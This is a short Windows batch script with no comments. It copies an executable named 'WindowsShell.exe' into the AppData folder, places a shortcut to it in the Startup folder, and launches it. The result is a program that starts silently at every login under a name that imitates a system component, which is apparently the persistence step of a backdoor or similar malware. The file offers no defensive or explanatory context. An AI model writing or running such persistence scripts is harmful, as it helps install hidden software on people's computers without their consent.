copy WindowsShell.exe %appdata%
copy WindowsShell.lnk "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsShell.lnk"
